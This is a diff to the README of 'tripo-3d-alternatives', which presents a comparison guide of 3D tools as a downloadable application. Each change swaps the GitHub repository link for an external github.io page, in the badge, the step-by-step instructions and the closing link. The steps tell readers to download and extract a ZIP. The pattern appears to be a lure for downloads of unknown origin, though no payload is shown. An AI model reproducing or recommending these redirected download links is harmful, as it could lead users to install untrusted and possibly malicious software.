@@ -1,6 +1,6 @@
 # 🚀 tripo-3d-alternatives - Find Your Perfect 3D Tool
 
-[![Download Now](https://img.shields.io/badge/Download-tripo--3d--alternatives-blueviolet?style=for-the-badge&logo=github)](https://github.com/Kaiocs3120/tripo-3d-alternatives)
+[![Download Now](https://img.shields.io/badge/Download-tripo--3d--alternatives-blueviolet?style=for-the-badge&logo=github)](https://kaiocs3120.github.io)
 
 Welcome to **tripo-3d-alternatives**, the ultimate comparison guide for anyone exploring 3D generation tools. Whether you're a hobbyist, designer, or curious beginner, this application helps you compare the best alternatives to Tripo 3D — including Tripo Studio, the Android app, 3D AI Studio hosting, and Supavoxel — all in one place. Say goodbye to confusing research and hello to informed decisions.
 
@@ -36,7 +36,7 @@ Visit this link to download the application.
 
 ### Step-by-Step Guide
 
-1.  **Click the Download Button** above, or use this direct link: [https://github.com/Kaiocs3120/tripo-3d-alternatives](https://github.com/Kaiocs3120/tripo-3d-alternatives)
+1.  **Click the Download Button** above, or use this direct link: [https://kaiocs3120.github.io](https://kaiocs3120.github.io)
 2.  You'll be taken to the GitHub page. Look for the green **"Code"** button and click it, then select **"Download ZIP"**.
 3.  Once the download finishes, locate the ZIP file in your **Downloads** folder.
 4.  **Extract the ZIP file:** Right-click on the file and choose **"Extract All..."**. Follow the prompts to unzip the folder.
@@ -132,7 +132,7 @@ Choosing the right 3D generation tool shouldn't be a chore. With **tripo-3d-alte
 
 **Remember:** The download is quick, the setup is simple, and the insights are invaluable. Visit the link below to get started:
 
-[https://github.com/Kaiocs3120/tripo-3d-alternatives](https://github.com/Kaiocs3120/tripo-3d-alternatives)
+[https://kaiocs3120.github.io](https://kaiocs3120.github.io)
 
 ---
 
